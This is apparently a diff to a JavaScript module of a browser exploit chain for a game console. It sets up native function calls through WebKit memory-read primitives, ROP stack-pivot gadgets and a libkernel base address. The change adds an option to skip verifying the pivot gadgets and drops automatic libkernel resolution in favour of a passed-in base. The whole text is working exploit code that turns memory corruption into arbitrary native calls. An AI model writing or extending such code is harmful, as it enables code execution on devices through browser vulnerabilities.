@@ -7,7 +7,6 @@ import {
     PIVOT_ROWS,
     verifyPivotSet,
 } from "./pivot_gadgets.js";
-import { resolveLibkernel } from "./libkernel_resolve.js";
 
 export const SYS = {
     getpid: 20,
@@ -158,35 +157,29 @@ export function initNativeCall(p, off, opts) {
     if (!webkitBase)
         throw new Error("native_call: need webkitBase or nativeFn+expm1");
 
-    const pivotCheck = verifyPivotSet(
-        addr => p.read1(addr),
-        webkitBase,
-        off
-    );
-    if (!pivotCheck.ok) {
-        const parts = [];
-        if (pivotCheck.missing.length)
-            parts.push("missing=" + pivotCheck.missing.join(","));
-        if (pivotCheck.bad.length)
-            parts.push("bad=" + pivotCheck.bad.join(","));
-        throw new Error("pivot-not-ready: " + parts.join(" ")
-            + " — wrong 13.00 RVAs crash/OOM; scan pivot on RW page first");
+    if (opts.skipPivotVerify) {
+        log("PIVOT-OK", "trusted (skip re-verify)");
+    } else {
+        const pivotCheck = verifyPivotSet(
+            addr => p.read1(addr),
+            webkitBase,
+            off
+        );
+        if (!pivotCheck.ok) {
+            const parts = [];
+            if (pivotCheck.missing.length)
+                parts.push("missing=" + pivotCheck.missing.join(","));
+            if (pivotCheck.bad.length)
+                parts.push("bad=" + pivotCheck.bad.join(","));
+            throw new Error("pivot-not-ready: " + parts.join(" ")
+                + " — wrong 13.00 RVAs crash/OOM; scan pivot on RW page first");
+        }
+        log("PIVOT-OK", pivotCheck.count + "/" + pivotCheck.total + " verified");
     }
-    log("PIVOT-OK", pivotCheck.count + "/" + pivotCheck.total + " verified");
 
     let libkernelBase = opts.libkernelBase || null;
-    if (!libkernelBase) {
-        const lk = resolveLibkernel(p, webkitBase, off, {
-            log,
-            allowScan: false,
-            read8: (pp, a) => {
-                try { return pp.read8(a); } catch (_) { return null; }
-            },
-        });
-        if (!lk.ok)
-            throw new Error(lk.error || "libkernel resolve failed");
-        libkernelBase = lk.lk;
-    }
+    if (!libkernelBase)
+        throw new Error("native_call: libkernelBase required (no resolve on HW)");
     log("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
 
     const resolved = trustGadgets
